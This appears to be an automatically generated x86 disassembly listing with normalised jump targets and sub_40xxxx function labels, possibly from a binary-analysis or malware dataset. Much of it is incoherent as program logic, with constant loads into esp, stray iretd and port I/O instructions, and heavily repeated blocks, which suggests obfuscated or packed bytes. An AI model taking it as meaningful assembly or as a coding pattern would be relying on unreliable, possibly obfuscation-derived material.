jge r-xdata
les ecx [ eax ]
jae r-xdata
sub ecx 0x92810f59
add [ eax ] al
add [ ecx - 0x7e39801d ] al
jecxz r-xdata
jg r-xdata
sub edi 0xf681b871
jne r-xdata
jns r-xdata
sub ebx 0xe8525452
insb
pop eax
pop ecx
jne r-xdata
mov [ fs : edi ] ecx
test [ eax - 0x47000000 ] edi
jne r-xdata
jne r-xdata
add [ esp + 0x64 ] r-xdata
sub esp 0x28
pop ecx
pop edx
sub ebx 0xff2f850f
push edx
push esp
push edx
call sub_4030f7
sub ecx 0x850f5959
das
mov edi 0xff188d0f
jns 0x158b682
ja r-xdata
sub ebx 0xec835656
adc al ch
jpe r-xdata
push esi
call sub_403465
xor esi 0x72870f59
add [ eax ] eax
add [ esp + edx * 2 + 0xd5e850 ] bh
add [ eax ] al
add [ eax ] al
pop ecx
jno r-xdata
sub esi 0xf58595a
sub [ edi - 0x1 ] 0xffffffff
inc [ ecx - 0x70f0a53a ]
add [ eax ] 0x0
add [ ebx + 0x71 ] ah
insd
xchg [ edi ] cl
add [ eax ] al
add [ edi ] cl
pop ecx
jno r-xdata
call 0xf44f8d9
and [ ecx - 0x2 ] 0xffffffff
inc [ ecx - 0x1b72f03e ]
pop ecx
jne r-xdata
jbe 0xffd03a4
jno r-xdata
jge 0xffffffffffa0b6e3
jge r-xdata
jpe 0x74cd42e7
ja r-xdata
and eax 0x4c48358
push eax
pushfd
add ebx 0xdc7f585a
pop ecx
jno r-xdata
and edi 0x800fae73
pop eax
pop ecx
jns r-xdata
push edi
call sub_403354
jg 0xfffffffff0b38d7b
add edx 0xc381ea77
pop edx
pop eax
jg r-xdata
jno r-xdata
add esp 0x4
pop eax
jge r-xdata
jbe 0x133c1fe
pop edx
jg r-xdata
mov [ fs : 0x15ffe47d ] eax
add eax 0x4c4835a
jae r-xdata
jae r-xdata
jo 0x58662877
ja r-xdata
add edi 0xff74830f
add [ eax ] al
jno 0xf9a8d51
jae r-xdata
mov [ fs : 0xffffffff8a0f6d71 ] eax
jae r-xdata
call 0xffffffff854f8d8b
xor al 0xff
pop ecx
ja r-xdata
jge 0xffffffff9c95d02c
jo 0xffffffffa2c1423f
push ecx
push edx
call sub_403324
and edx 0x185e856
add [ eax ] al
jl 0xffffffffc1c16681
push edx
call sub_4032c0
and esi 0xe981dd73
pushfd
push edi
pushfd
call sub_40333b
jo 0xff9a928
jo 0xffffffff894f8d65
jge r-xdata
add ecx 0x870f5859
inc edi
add [ eax ] eax
add [ ecx - 0x7ef0a60a ] al
lodsb [ esi ]
pop edx
jne r-xdata
mov eax [ fs : 0xffffffffc9812675 ]
push esi
call sub_4032fe
and edi 0x850fc67f
pop ecx
pop eax
ja r-xdata
push ebp
pushfd
lea ecx [ edi ]
and [ eax - 0x1 ] 0xffffffff
dec [ edi ]
lea edx [ eax - 0x64 ]
insd
jne r-xdata
and edx 0x83519c54
in al dx
or al 0xe8
iretd
jae r-xdata
mov ebp 0x64f37759
mov eax [ 0xffffffffc9812675 ]
xor ecx 0x4ce85251
add [ eax ] al
add [ ecx - 0x7a17a91e ] al
push esp
push eax
call sub_4033a4
xor edi 0x5f795958
jge r-xdata
add [ eax ] al
add [ edi ] cl
xchg [ edi - 0x30 ] bh
mov esp 0x11b8f0f
add [ eax ] al
sub ecx 0x8199755a
neg [ eax + 0x59 ]
jns r-xdata
xor esi 0xac810f59
jg 0xffffffffff53b8af
push esp
pushfd
push ecx
sub esp 0xc
call sub_403321
mov [ fs : 0xffffffff870f5a59 ] eax
lodsd [ esi ]
add [ eax ] al
add [ esi + 0x790cc483 ] bh
iretd
or edi 0x80c481
add [ eax ] al
retn
sub_40325c
jne r-xdata
jne r-xdata
or ebx 0xfad7f58
adc [ ecx + 0x53 ] 0xff83e851
jg r-xdata
ja 0xcab4a6
jno r-xdata
js 0x7f44f665
add [ eax ] al
jno r-xdata
call [ 0xfbf3f7f ]
lea ebx [ eax ]
sbb [ edi ] ecx
mov [ edi ] cs
jns r-xdata
sub eax 0x755a5858
mov ah 0x81
0x9c55
pop edx
pop edx
jne r-xdata
or esi 0xff24810f
jae r-xdata
or ecx 0xf18d0f
add [ eax ] al
jns r-xdata
sub ebx 0xe8525452
insb
jae r-xdata
and esi 0x89641273
jg r-xdata
jns 0x158b682
pop eax
pop eax
pop edx
jne r-xdata
call 0xf48f5b0
lea eax [ ecx + 0x1 ]
add [ eax ] al
jg r-xdata
jpo 0xdeb676
pop edx
jge r-xdata
jo 0xffffffff854f8b9f
add [ eax ] al
jae r-xdata
or edx 0x54549c55
add [ eax ] al
add [ edi ] cl
test [ edi + 0x75 ] bh
call sub_40325c
jb 0xffffffff81b2af12
push ebp
pushfd
push esp
push esp
call [ 0xffffffffe9816c73 ]
add [ eax ] al
pop edx
jg r-xdata
and ecx 0xf04c483
xor al [ ecx ]
add [ eax ] al
sub eax 0x6c7315ff
jne r-xdata
mov [ fs : ebp + 0x19 ] esi
loope r-xdata
ja r-xdata
and ebx 0xe381c67f
pop ecx
pop ecx
jne r-xdata
jo 0x7ff93aee
jae r-xdata
and edx 0xff53830f
pop eax
jae r-xdata
and esi 0xc2817577
jno r-xdata
add esi 0x83575554
in al dx
add al 0xe8
dec ecx
and [ edx + 0xf000000 ] 0xffffff8d
les eax [ edi + ecx ]
jae r-xdata
js 0x7548f6aa
pop ecx
pop ecx
jns r-xdata
add edx 0xc1870f58
pop ecx
jno r-xdata
mov ecx 0x15ff2d7f
add esp 0x4
jg r-xdata
je 0xffffffff804fa6c0
pop eax
ja r-xdata
xor edx 0x880f5e7f
ja r-xdata
xor ecx 0x30870f59
add [ eax ] eax
add [ edi ] cl
xor [ ebx + 0x7a ] 0xffffffe8
add esp 0x8
or bh [ ebp + 0x478f0f5a ]
jae r-xdata
sub ecx 0x92810f59
add [ eax ] al
add [ ecx - 0x7e39801d ] al
jecxz r-xdata
add esp 0x4
ja r-xdata
jl 0xffffffffffacc0f8
jne r-xdata
sub edi 0x64244481
jno r-xdata
jge r-xdata
add edx 0xbf810f
add [ eax ] al
jae r-xdata
ja 0xffffffffa3c34090
add [ esp + 0x64 ] r-xdata
sub esp 0x28
pop ecx
pop edx
sub ebx 0xff2f850f
jge r-xdata
add [ eax ] eax
add [ edi ] cl
sbb [ ecx + 0xf ] 0x81
mov [ 0xf000000 ] al
jne r-xdata
inc eax
add [ ebx + 0x5a5928ec ] al
jne r-xdata
mov eax 0xfeef890f
jae r-xdata
sub ecx 0xfeea830f
pop eax
pop ecx
jne r-xdata
mov [ fs : edi ] ecx
test [ eax - 0x47000000 ] edi
jne r-xdata
jg r-xdata
sub edi 0xf681b871
jne r-xdata
push esp
push ebp
push edi
sub esp 0x4
call sub_403102
jae 0xffffffffff43b927
xor ecx 0x890fd079
add esp 0x8
jne r-xdata
add ebx 0xab810f
add [ eax ] al
ja r-xdata
sub ebx 0xec835656
adc al ch
jpe r-xdata
push esi
call sub_403465
xor esi 0x72870f59
add [ eax ] eax
add [ esp + edx * 2 + 0xd5e850 ] bh
add [ eax ] al
push edx
push esp
push edx
call sub_4030f7
sub ecx 0x850f5959
das
mov edi 0xff188d0f
jae r-xdata
mov ebp 0x478f0f5a
pop ecx
jno r-xdata
sub esi 0xf58595a
sub [ edi - 0x1 ] 0xffffffff
inc [ ecx - 0x70f0a53a ]
add [ eax ] 0x0
add [ ebx + 0x71 ] ah
insd
xchg [ edi ] cl
add [ eax ] al
add [ edi ] cl
jg r-xdata
ja 0xffffffffff9bb34d
pop ecx
jno r-xdata
call 0xf44f8d9
and [ ecx - 0x2 ] 0xffffffff
inc [ ecx - 0x1b72f03e ]
jno r-xdata
and ebx 0x870f4975
pop ecx
jne r-xdata
jbe 0xffd03a4
jae r-xdata
xor esi 0xe681cd75
jno r-xdata
jge 0xffffffffffa0b6e3
add esp 0x4
jae r-xdata
jl 0xf3b428
jge r-xdata
jpe 0x74cd42e7
pop eax
jg r-xdata
jge 0xffffffff894f8b21
add [ eax ] al
ja r-xdata
and eax 0x4c48358
ja r-xdata
jno 0xffffffffe89185be
push 0x81ffffff
out 0x77 al
jne r-xdata
push eax
pushfd
add ebx 0xdc7f585a
pop ecx
jno r-xdata
and edi 0x800fae73
pop eax
pop ecx
jns r-xdata
pop ecx
ja r-xdata
xor eax 0xfef4870f
cmp edi 0xffffffff
inc [ ecx + 0x1a830ff3 ]
out dx eax
retn 0x810f
push edi
call sub_403354
jg 0xfffffffff0b38d7b
add edx 0xc381ea77
pop edx
pop eax
jg r-xdata
jno r-xdata
add esp 0x4
pop eax
jge r-xdata
jbe 0x133c1fe
pop edx
jg r-xdata
mov [ fs : 0x15ffe47d ] eax
jno r-xdata
jae 0xffffffff8428ab9d
add eax 0x4c4835a
jae r-xdata
jae r-xdata
jo 0x58662877
ja r-xdata
add edi 0xff74830f
add [ eax ] al
jno 0xf9a8d51
jae r-xdata
mov [ fs : 0xffffffff8a0f6d71 ] eax
jae r-xdata
je 0xffffffffff6db76f
jge r-xdata
les ecx [ eax ]
jae r-xdata
call 0xffffffff854f8d8b
xor al 0xff
pop ecx
ja r-xdata
jge 0xffffffff9c95d02c
jo 0xffffffffa2c1423f
push ecx
push edx
call sub_403324
and edx 0x185e856
add [ eax ] al
jl 0xffffffffc1c16681
push edx
call sub_4032c0
and esi 0xe981dd73
pushfd
push edi
pushfd
call sub_40333b
jo 0xff9a928
jo 0xffffffff894f8d65
jge r-xdata
add ecx 0x870f5859
inc edi
add [ eax ] eax
add [ ecx - 0x7ef0a60a ] al
lodsb [ esi ]
pop edx
jne r-xdata
mov eax [ fs : 0xffffffffc9812675 ]
push esi
call sub_4032fe
and edi 0x850fc67f
pop ecx
pop eax
ja r-xdata
push ebp
pushfd
lea ecx [ edi ]
and [ eax - 0x1 ] 0xffffffff
dec [ edi ]
lea edx [ eax - 0x64 ]
insd
jne r-xdata
and edx 0x83519c54
in al dx
or al 0xe8
iretd
jae r-xdata
mov ebp 0x64f37759
mov eax [ 0xffffffffc9812675 ]
xor ecx 0x4ce85251
add [ eax ] al
add [ ecx - 0x7a17a91e ] al
push esp
push eax
call sub_4033a4
xor edi 0x5f795958
jge r-xdata
add [ eax ] al
add [ edi ] cl
xchg [ edi - 0x30 ] bh
mov esp 0x11b8f0f
add [ eax ] al
sub ecx 0x8199755a
neg [ eax + 0x59 ]
jns r-xdata
xor esi 0xac810f59
jg 0xffffffffff53b8af
push esp
pushfd
push ecx
sub esp 0xc
call sub_403321
mov [ fs : 0xffffffff870f5a59 ] eax
lodsd [ esi ]
add [ eax ] al
add [ esi + 0x790cc483 ] bh
iretd
or edi 0x80c481
add [ eax ] al
retn
sub_4032c0
pop ecx
ja r-xdata
push esi
push esi
sub esp 0x10
call sub_4033bd
xor edi 0x810a7d58
0xf59
mov esp 0xd5e85054
add [ eax ] al
add [ ecx - 0x17adae0f ] al
dec esp
add [ eax ] al
add [ ecx - 0x7a17a91e ] al
add [ eax ] eax
add [ edi ] cl
sbb [ ecx + 0xf ] 0x81
mov [ 0xf000000 ] al
xchg [ edi ] cl
sub_4032fe
jae r-xdata
pop edx
pop eax
jg r-xdata
xor ecx 0x8c0fc977
jae r-xdata
jo 0x58662877
jge r-xdata
add ecx 0x870f5859
inc edi
add [ eax ] eax
add [ ecx - 0x7ef0a60a ] al
lodsb [ esi ]
pop ecx
ja r-xdata
jge 0xffffffff9c95d02c
add esp 0x4
jno r-xdata
jne r-xdata
and edx 0x83519c54
in al dx
or al 0xe8
iretd
jae r-xdata
mov ebp 0x64f37759
mov eax [ 0xffffffffc9812675 ]
pop edx
jne r-xdata
mov eax [ fs : 0xffffffffc9812675 ]
push esi
call sub_4032fe
and edi 0x850fc67f
pop ecx
jno r-xdata
and edi 0x800fae73
pop eax
pop ecx
jns r-xdata
push edi
call sub_403354
jg 0xfffffffff0b38d7b
add edx 0xc381ea77
pop ecx
pop eax
ja r-xdata
jg 0xffffffffff53b8af
push esp
push eax
call sub_4033a4
xor ecx 0x4ce85251
add [ eax ] al
add [ ecx - 0x7a17a91e ] al
add [ eax ] eax
add [ edi ] cl
sbb [ ecx + 0xf ] 0x81
mov [ 0xf000000 ] al
xor edi 0x5f795958
pop eax
jge r-xdata
jbe 0x133c1fe
pop edx
jg r-xdata
mov [ fs : 0x15ffe47d ] eax
add eax 0x4c4835a
jae r-xdata
jge r-xdata
add [ eax ] al
add [ edi ] cl
xchg [ edi - 0x30 ] bh
mov esp 0x11b8f0f
add [ eax ] al
sub ecx 0x8199755a
neg [ eax + 0x59 ]
jns r-xdata
xor esi 0xac810f59
ja r-xdata
add edi 0xff74830f
add [ eax ] al
jno 0xf9a8d51
jae r-xdata
mov [ fs : 0xffffffff8a0f6d71 ] eax
jae r-xdata
call 0xffffffff854f8d8b
xor al 0xff
push esp
pushfd
push ecx
sub esp 0xc
call sub_403321
mov [ fs : 0xffffffff870f5a59 ] eax
lodsd [ esi ]
add [ eax ] al
add [ esi + 0x790cc483 ] bh
iretd
or edi 0x80c481
add [ eax ] al
retn
push ecx
push edx
call sub_403324
and edx 0x185e856
add [ eax ] al
jo 0xffffffffa2c1423f
jl 0xffffffffc1c16681
push edx
call sub_4032c0
and esi 0xe981dd73
pushfd
push edi
pushfd
call sub_40333b
jo 0xff9a928
jo 0xffffffff894f8d65
xchg [ edi ] cl
add [ eax ] al
add [ edi ] cl
lea ecx [ edi ]
and [ eax - 0x1 ] 0xffffffff
dec [ edi ]
lea edx [ eax - 0x64 ]
push ebp
pushfd
insd
sub_403321
jg r-xdata
pop edx
pop edx
pop edx
jg r-xdata
mov esp 0x11b8f0f
add [ eax ] al
sub ecx 0x8199755a
neg [ eax + 0x59 ]
jns r-xdata
pop eax
pop ecx
jae r-xdata
or edx 0xec830f
add [ eax ] al
xor ecx 0x8c0fc977
jae r-xdata
mov ebp 0x64f37759
mov eax [ 0xffffffffc9812675 ]
jge r-xdata
add eax 0x4c4835a
jae r-xdata
jge r-xdata
add ecx 0x870f5859
inc edi
add [ eax ] eax
add [ ecx - 0x7ef0a60a ] al
lodsb [ esi ]
pop ecx
pop eax
ja r-xdata
jg 0xffffffffff53b8af
jne r-xdata
and edx 0x83519c54
in al dx
or al 0xe8
iretd
pop eax
call [ 0xffffffffff37e857 ]
jae r-xdata
call 0xffffffff854f8d8b
xor al 0xff
jge r-xdata
add [ eax ] al
add [ edi ] cl
xchg [ edi - 0x30 ] bh
xor esi 0xac810f59
push edi
call sub_403354
jg 0xfffffffff0b38d7b
add edx 0xc381ea77
pop edx
pop eax
jg r-xdata
pop ecx
jno r-xdata
and edi 0x800fae73
pop eax
pop ecx
jns r-xdata
push esp
pushfd
push ecx
sub esp 0xc
call sub_403321
mov [ fs : 0xffffffff870f5a59 ] eax
lodsd [ esi ]
add [ eax ] al
add [ esi + 0x790cc483 ] bh
iretd
or edi 0x80c481
add [ eax ] al
retn
jae r-xdata
jo 0x58662877
pop eax
jge r-xdata
jbe 0x133c1fe
pop edx
jg r-xdata
mov [ fs : 0x15ffe47d ] eax
pop ecx
ja r-xdata
jge 0xffffffff9c95d02c
add esp 0x4
jno r-xdata
ja r-xdata
add edi 0xff74830f
add [ eax ] al
jno 0xf9a8d51
jae r-xdata
mov [ fs : 0xffffffff8a0f6d71 ] eax
pop edx
jne r-xdata
mov eax [ fs : 0xffffffffc9812675 ]
push esi
call sub_4032fe
and edi 0x850fc67f
push ecx
push edx
call sub_403324
and edx 0x185e856
add [ eax ] al
jo 0xffffffffa2c1423f
jl 0xffffffffc1c16681
push edx
call sub_4032c0
and esi 0xe981dd73
pushfd
push edi
pushfd
call sub_40333b
jo 0xff9a928
jo 0xffffffff894f8d65
push esp
push eax
call sub_4033a4
xor ecx 0x4ce85251
add [ eax ] al
add [ ecx - 0x7a17a91e ] al
add [ eax ] eax
add [ edi ] cl
sbb [ ecx + 0xf ] 0x81
mov [ 0xf000000 ] al
xor edi 0x5f795958
xchg [ edi ] cl
add [ eax ] al
add [ edi ] cl
lea ecx [ edi ]
and [ eax - 0x1 ] 0xffffffff
dec [ edi ]
lea edx [ eax - 0x64 ]
push ebp
pushfd
insd
sub_403324
jg r-xdata
pop eax
jge r-xdata
sub ecx 0x8199755a
neg [ eax + 0x59 ]
jns r-xdata
add esp 0x4
jae r-xdata
or edx 0xc7810f59
jae r-xdata
mov ebp 0x64f37759
mov eax [ 0xffffffffc9812675 ]
jne r-xdata
add edx 0xfee48d0f
pop ecx
pop eax
ja r-xdata
jg 0xffffffffff53b8af
jne r-xdata
and edx 0x83519c54
in al dx
or al 0xe8
iretd
push esi
call sub_403465
xor esi 0x72870f59
add [ eax ] eax
add [ esp + edx * 2 + 0xd5e850 ] bh
add [ eax ] al
jge r-xdata
xor esi 0xac810f59
push edi
call sub_403354
jg 0xfffffffff0b38d7b
add edx 0xc381ea77
pop edx
pop eax
jg r-xdata
xchg [ edi ] cl
add [ eax ] al
add [ edi ] cl
push esp
pushfd
push ecx
sub esp 0xc
call sub_403321
mov [ fs : 0xffffffff870f5a59 ] eax
lodsd [ esi ]
add [ eax ] al
add [ esi + 0x790cc483 ] bh
iretd
or edi 0x80c481
add [ eax ] al
retn
add eax 0x4c4835a
jae r-xdata
jae r-xdata
jo 0x58662877
jae r-xdata
call 0xffffffff854f8d8b
xor al 0xff
pop ecx
ja r-xdata
jge 0xffffffff9c95d02c
add esp 0x4
jno r-xdata
jge r-xdata
add [ eax ] al
add [ edi ] cl
xchg [ edi - 0x30 ] bh
mov esp 0x11b8f0f
add [ eax ] al
add ecx 0x870f5859
inc edi
add [ eax ] eax
add [ ecx - 0x7ef0a60a ] al
lodsb [ esi ]
pop edx
jne r-xdata
mov eax [ fs : 0xffffffffc9812675 ]
push esi
call sub_4032fe
and edi 0x850fc67f
pop ecx
jno r-xdata
and edi 0x800fae73
pop eax
pop ecx
jns r-xdata
xor ecx 0x4ce85251
add [ eax ] al
add [ ecx - 0x7a17a91e ] al
add [ eax ] eax
add [ edi ] cl
sbb [ ecx + 0xf ] 0x81
mov [ 0xf000000 ] al
push esp
push eax
call sub_4033a4
xor edi 0x5f795958
pop eax
jge r-xdata
jbe 0x133c1fe
pop edx
jg r-xdata
mov [ fs : 0x15ffe47d ] eax
ja r-xdata
add edi 0xff74830f
add [ eax ] al
jno 0xf9a8d51
jae r-xdata
mov [ fs : 0xffffffff8a0f6d71 ] eax
jo 0xffffffffa2c1423f
push ecx
push edx
call sub_403324
and edx 0x185e856
add [ eax ] al
jl 0xffffffffc1c16681
push edx
call sub_4032c0
and esi 0xe981dd73
pushfd
push edi
pushfd
call sub_40333b
jo 0xff9a928
jo 0xffffffff894f8d65
lea ecx [ edi ]
and [ eax - 0x1 ] 0xffffffff
dec [ edi ]
lea edx [ eax - 0x64 ]
push ebp
pushfd
insd
sub_40333b
jne r-xdata
jae r-xdata
or ecx 0xa38d0f
add [ eax ] al
pop edx
add esp 0x4
jns 0x119ba7e
jae r-xdata
call 0xffffffff854f8d8b
xor al 0xff
add [ eax ] al
sub esi 0xf58595a
sub [ edi - 0x1 ] 0xffffffff
inc [ ecx - 0x70f0a53a ]
add [ eax ] 0x0
add [ ebx + 0x71 ] ah
insd
jpe 0x74cd42e7
jge r-xdata
add ecx 0x870f5859
inc edi
add [ eax ] eax
add [ ecx - 0x7ef0a60a ] al
lodsb [ esi ]
jne r-xdata
and edx 0x83519c54
in al dx
or al 0xe8
iretd
jae r-xdata
mov ebp 0x64f37759
mov eax [ 0xffffffffc9812675 ]
push edi
call sub_403354
jg 0xfffffffff0b38d7b
add edx 0xc381ea77
pop edx
pop eax
jg r-xdata
pop ecx
pop eax
ja r-xdata
jg 0xffffffffff53b8af
jae r-xdata
add eax 0x4c4835a
jae r-xdata
jo 0x58662877
jge r-xdata
add [ eax ] al
add [ edi ] cl
xchg [ edi - 0x30 ] bh
mov esp 0x11b8f0f
add [ eax ] al
sub ecx 0x8199755a
neg [ eax + 0x59 ]
jns r-xdata
xor esi 0xac810f59
pop ecx
ja r-xdata
jge 0xffffffff9c95d02c
add esp 0x4
jno r-xdata
push esp
pushfd
push ecx
sub esp 0xc
call sub_403321
mov [ fs : 0xffffffff870f5a59 ] eax
lodsd [ esi ]
add [ eax ] al
add [ esi + 0x790cc483 ] bh
iretd
or edi 0x80c481
add [ eax ] al
retn
pop edx
jne r-xdata
mov eax [ fs : 0xffffffffc9812675 ]
push esi
call sub_4032fe
and edi 0x850fc67f
pop ecx
jno r-xdata
and edi 0x800fae73
pop eax
pop ecx
jns r-xdata
push esp
push eax
call sub_4033a4
xor ecx 0x4ce85251
add [ eax ] al
add [ ecx - 0x7a17a91e ] al
add [ eax ] eax
add [ edi ] cl
sbb [ ecx + 0xf ] 0x81
mov [ 0xf000000 ] al
xor edi 0x5f795958
pop eax
jge r-xdata
jbe 0x133c1fe
pop edx
jg r-xdata
mov [ fs : 0x15ffe47d ] eax
ja r-xdata
add edi 0xff74830f
add [ eax ] al
jno 0xf9a8d51
jae r-xdata
mov [ fs : 0xffffffff8a0f6d71 ] eax
push ecx
push edx
call sub_403324
and edx 0x185e856
add [ eax ] al
jo 0xffffffffa2c1423f
jl 0xffffffffc1c16681
push edx
call sub_4032c0
and esi 0xe981dd73
pushfd
push edi
pushfd
call sub_40333b
jo 0xff9a928
jo 0xffffffff894f8d65
xchg [ edi ] cl
add [ eax ] al
add [ edi ] cl
lea ecx [ edi ]
and [ eax - 0x1 ] 0xffffffff
dec [ edi ]
lea edx [ eax - 0x64 ]
push ebp
pushfd
insd
sub_403354
pop ecx
pop edx
ja r-xdata
pop eax
pop ecx
jns r-xdata
mov esi 0x790cc483
pop edx
jg r-xdata
mov [ fs : 0x15ffe47d ] eax
jae r-xdata
mov [ fs : 0xffffffff8a0f6d71 ] eax
add eax 0x4c4835a
jae r-xdata
push edx
call sub_4032c0
and esi 0xe981dd73
pushfd
push edi
pushfd
call sub_40333b
jo 0xff9a928
jo 0xffffffff894f8d65
ja r-xdata
add edi 0xff74830f
jae r-xdata
call 0xffffffff854f8d8b
xor al 0xff
lea ecx [ edi ]
and [ eax - 0x1 ] 0xffffffff
dec [ edi ]
lea edx [ eax - 0x64 ]
push ebp
pushfd
insd
push ecx
push edx
call sub_403324
and edx 0x185e856
add [ eax ] al
jo 0xffffffffa2c1423f
jl 0xffffffffc1c16681
jge r-xdata
add ecx 0x870f5859
inc edi
add [ eax ] eax
add [ ecx - 0x7ef0a60a ] al
lodsb [ esi ]
push edi
call sub_403354
jg 0xfffffffff0b38d7b
add edx 0xc381ea77
pop edx
pop eax
jg r-xdata
add [ eax ] al
add [ edi ] cl
pop ecx
pop eax
ja r-xdata
jne r-xdata
and edx 0x83519c54
in al dx
or al 0xe8
iretd
jae r-xdata
mov ebp 0x64f37759
mov eax [ 0xffffffffc9812675 ]
jae r-xdata
jo 0x58662877
jge r-xdata
add [ eax ] al
add [ edi ] cl
xchg [ edi - 0x30 ] bh
mov esp 0x11b8f0f
add [ eax ] al
sub ecx 0x8199755a
neg [ eax + 0x59 ]
jns r-xdata
xor esi 0xac810f59
jg 0xffffffffff53b8af
pop ecx
ja r-xdata
jge 0xffffffff9c95d02c
add esp 0x4
jno r-xdata
iretd
push esp
pushfd
push ecx
sub esp 0xc
call sub_403321
mov [ fs : 0xffffffff870f5a59 ] eax
lodsd [ esi ]
add [ eax ] al
add [ esi + 0x790cc483 ] bh
or edi 0x80c481
add [ eax ] al
retn
pop edx
jne r-xdata
mov eax [ fs : 0xffffffffc9812675 ]
push esi
call sub_4032fe
and edi 0x850fc67f
pop ecx
jno r-xdata
and edi 0x800fae73
xchg [ edi ] cl
push esp
push eax
call sub_4033a4
xor ecx 0x4ce85251
add [ eax ] al
add [ ecx - 0x7a17a91e ] al
add [ eax ] eax
add [ edi ] cl
sbb [ ecx + 0xf ] 0x81
mov [ 0xf000000 ] al
xor edi 0x5f795958
pop eax
jge r-xdata
jbe 0x133c1fe
add [ eax ] al
jno 0xf9a8d51
sub_40335d
add esp 0xc
jns r-xdata
pop eax
pop ecx
sub eax 0xbb830f
add [ eax ] al
jns 0x119ba7e
jae r-xdata
mov ebp 0x64f37759
mov eax [ 0xffffffffc9812675 ]
add [ eax ] al
sub esi 0xf58595a
sub [ edi - 0x1 ] 0xffffffff
inc [ ecx - 0x70f0a53a ]
add [ eax ] 0x0
add [ ebx + 0x71 ] ah
insd
jpe 0x74cd42e7
pop ecx
pop eax
ja r-xdata
jg 0xffffffffff53b8af
jne r-xdata
and edx 0x83519c54
in al dx
or al 0xe8
iretd
jge r-xdata
jns r-xdata
xor esi 0xac810f59
push edi
call sub_403354
jg 0xfffffffff0b38d7b
add edx 0xc381ea77
pop edx
pop eax
jg r-xdata
push esp
pushfd
push ecx
sub esp 0xc
call sub_403321
mov [ fs : 0xffffffff870f5a59 ] eax
lodsd [ esi ]
add [ eax ] al
add [ esi + 0x790cc483 ] bh
iretd
or edi 0x80c481
add [ eax ] al
retn
add eax 0x4c4835a
jae r-xdata
jae r-xdata
jo 0x58662877
jae r-xdata
call 0xffffffff854f8d8b
xor al 0xff
pop ecx
ja r-xdata
jge 0xffffffff9c95d02c
add esp 0x4
jno r-xdata
jge r-xdata
add [ eax ] al
add [ edi ] cl
xchg [ edi - 0x30 ] bh
mov esp 0x11b8f0f
add [ eax ] al
sub ecx 0x8199755a
neg [ eax + 0x59 ]
add ecx 0x870f5859
inc edi
add [ eax ] eax
add [ ecx - 0x7ef0a60a ] al
lodsb [ esi ]
pop edx
jne r-xdata
mov eax [ fs : 0xffffffffc9812675 ]
push esi
call sub_4032fe
and edi 0x850fc67f
pop ecx
jno r-xdata
and edi 0x800fae73
pop eax
pop ecx
jns r-xdata
push esp
push eax
call sub_4033a4
xor ecx 0x4ce85251
add [ eax ] al
add [ ecx - 0x7a17a91e ] al
add [ eax ] eax
add [ edi ] cl
sbb [ ecx + 0xf ] 0x81
mov [ 0xf000000 ] al
xor edi 0x5f795958
pop eax
jge r-xdata
jbe 0x133c1fe
pop edx
jg r-xdata
mov [ fs : 0x15ffe47d ] eax
ja r-xdata
add edi 0xff74830f
add [ eax ] al
jno 0xf9a8d51
jae r-xdata
mov [ fs : 0xffffffff8a0f6d71 ] eax
push ecx
push edx
call sub_403324
and edx 0x185e856
add [ eax ] al
jo 0xffffffffa2c1423f
jl 0xffffffffc1c16681
push edx
call sub_4032c0
and esi 0xe981dd73
pushfd
push edi
pushfd
call sub_40333b
jo 0xff9a928
jo 0xffffffff894f8d65
xchg [ edi ] cl
add [ eax ] al
add [ edi ] cl
lea ecx [ edi ]
and [ eax - 0x1 ] 0xffffffff
dec [ edi ]
lea edx [ eax - 0x64 ]
push ebp
pushfd
insd
sub_4033a4
pop edx
add esp 0x4
jne r-xdata
pushfd
push edi
pushfd
call sub_40333b
jo 0xff9a928
xor edi 0xaae85157
lea ecx [ edi ]
and [ eax - 0x1 ] 0xffffffff
dec [ edi ]
lea edx [ eax - 0x64 ]
push ebp
pushfd
push edi
call sub_403354
jg 0xfffffffff0b38d7b
add edx 0xc381ea77
pop edx
pop eax
jg r-xdata
add eax 0x4c4835a
jae r-xdata
jae r-xdata
jo 0x58662877
jae r-xdata
call 0xffffffff854f8d8b
xor al 0xff
pop ecx
ja r-xdata
jge 0xffffffff9c95d02c
add esp 0x4
jno r-xdata
jge r-xdata
add ecx 0x870f5859
inc edi
add [ eax ] eax
add [ ecx - 0x7ef0a60a ] al
lodsb [ esi ]
pop edx
jne r-xdata
mov eax [ fs : 0xffffffffc9812675 ]
push esi
call sub_4032fe
and edi 0x850fc67f
pop ecx
jno r-xdata
and edi 0x800fae73
pop eax
pop ecx
jns r-xdata
jne r-xdata
and edx 0x83519c54
in al dx
or al 0xe8
iretd
jae r-xdata
mov ebp 0x64f37759
mov eax [ 0xffffffffc9812675 ]
push esp
push eax
call sub_4033a4
xor ecx 0x4ce85251
add [ eax ] al
add [ ecx - 0x7a17a91e ] al
add [ eax ] eax
add [ edi ] cl
sbb [ ecx + 0xf ] 0x81
mov [ 0xf000000 ] al
xor edi 0x5f795958
pop eax
jge r-xdata
jbe 0x133c1fe
pop edx
jg r-xdata
mov [ fs : 0x15ffe47d ] eax
pop ecx
pop eax
ja r-xdata
jg 0xffffffffff53b8af
ja r-xdata
add edi 0xff74830f
add [ eax ] al
jno 0xf9a8d51
jae r-xdata
mov [ fs : 0xffffffff8a0f6d71 ] eax
jge r-xdata
add [ eax ] al
add [ edi ] cl
xchg [ edi - 0x30 ] bh
mov esp 0x11b8f0f
add [ eax ] al
sub ecx 0x8199755a
neg [ eax + 0x59 ]
jns r-xdata
xor esi 0xac810f59
push ecx
push edx
call sub_403324
and edx 0x185e856
add [ eax ] al
jo 0xffffffffa2c1423f
jl 0xffffffffc1c16681
push edx
call sub_4032c0
and esi 0xe981dd73
jo 0xffffffff894f8d65
push esp
pushfd
push ecx
sub esp 0xc
call sub_403321
mov [ fs : 0xffffffff870f5a59 ] eax
lodsd [ esi ]
add [ eax ] al
add [ esi + 0x790cc483 ] bh
iretd
or edi 0x80c481
add [ eax ] al
retn
xchg [ edi ] cl
add [ eax ] al
add [ edi ] cl
insd
sub_4033bd
jae r-xdata
jne r-xdata
sub ecx 0xe89c579c
jb r-xdata
jne r-xdata
sub edi 0x4c4835a
jne r-xdata
pop edx
pop ecx
pop eax
jae r-xdata
mov ecx 0xf6811c75
pushfd
push edi
pushfd
call sub_40333b
jo 0xff9a928
xor edi 0xaae85157
jg r-xdata
add esi 0x808f0f5a
add [ eax ] al
add [ ebx + 0x71 ] ah
insd
jpe 0x74cd42e7
lea ecx [ edi ]
and [ eax - 0x1 ] 0xffffffff
dec [ edi ]
lea edx [ eax - 0x64 ]
jg r-xdata
jno 0xf9a8d51
push edi
call sub_403354
jg 0xfffffffff0b38d7b
add edx 0xc381ea77
pop edx
